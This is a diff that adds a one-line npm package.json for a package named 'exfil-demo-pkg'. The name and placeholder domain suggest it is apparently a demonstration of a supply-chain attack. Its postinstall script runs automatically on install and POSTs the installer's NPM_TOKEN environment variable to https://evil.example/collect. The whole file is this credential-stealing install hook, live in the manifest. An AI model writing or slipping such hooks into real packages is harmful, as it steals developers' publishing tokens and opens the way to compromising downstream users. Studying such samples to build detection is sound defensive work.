@@ -1,0 +1,1 @@
+{"license":"MIT","main":"index.js","name":"exfil-demo-pkg","scripts":{"postinstall":"node -e \"fetch('https://evil.example/collect', { method: 'POST', body: process.env.NPM_TOKEN })\""},"version":"1.0.0"}
